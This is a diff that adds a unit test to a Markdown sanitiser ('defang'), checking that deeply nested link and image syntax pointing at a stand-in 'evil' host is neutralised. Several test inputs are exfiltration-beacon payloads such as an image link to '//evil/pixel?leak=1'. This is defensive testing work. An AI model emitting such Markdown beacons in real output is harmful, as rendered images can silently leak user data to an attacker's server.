@@ -128,6 +128,30 @@ def test_code_span_in_link_alt_does_not_protect():
     assert defang("use `<img>` carefully") == "use `<img>` carefully"
 
 
+def test_deeply_nested_link_brackets_neutralized():
+    """CommonMark allows arbitrarily deep bracket nesting in link/image
+    text; a regex can't model it, so a balanced-bracket scanner must — a
+    2+-level nested alt with a protocol-relative dest was a live beacon
+    (round-6 P0; verified inert vs cmark-gfm)."""
+    for s in ("hi ![a[b[c]d]e](//evil/pixel?leak=1) bye",
+              "![a[b[c[d]e]f]g](//evil/deep)",
+              "[a[b]c](http://evil/x)",
+              "![a\\]b](//evil/esc)",
+              "[![`x`](//evil/img)](//evil/tgt)"):
+        d = defang(s)
+        assert "](//evil" not in _outside_code(d), (s, d)
+        assert "](http://evil" not in _outside_code(d).lower(), (s, d)
+    # non-regression: plain text and a bare [footnote] are untouched
+    assert defang("see [footnote] later") == "see [footnote] later"
+    assert defang("just some prose") == "just some prose"
+
+
+def _outside_code(s):
+    """The parts of s NOT inside a backtick code span (crude: drop `...`)."""
+    import re as _re
+    return _re.sub(r"`[^`]*`", "", s)
+
+
 def test_www_autolinks_defused():
     for s in ["visit www.evil.example/x now", "![](www.evil.example/pixel)",
               "WWW.EVIL.EXAMPLE"]:
